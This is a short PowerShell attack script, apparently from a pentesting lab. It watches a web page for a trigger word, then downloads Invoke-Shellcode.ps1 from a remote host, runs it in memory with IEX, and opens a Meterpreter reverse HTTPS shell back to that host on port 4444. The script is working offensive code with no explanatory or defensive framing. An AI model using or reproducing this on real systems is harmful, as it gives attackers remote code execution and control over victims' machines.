#Credit to @obscuresec and @mattifestation for this

$Word = 'pentestlab'
$WebClientObject = New-Object Net.WebClient
$comment = "https://pentestlab.blog"
$WebClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36)") 
While($True){
$CommentResult = $WebClientObject.DownloadString($comment)
$Found = $CommentResult.contains($Word)
If($Found) {
IEX $WebClientObject.DownloadString('http://192.168.188.129:8888/Invoke-Shellcode.ps1')
Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST 192.168.188.129 -LPORT 4444 -Force
Return
}
Start-Sleep -Seconds 30
}
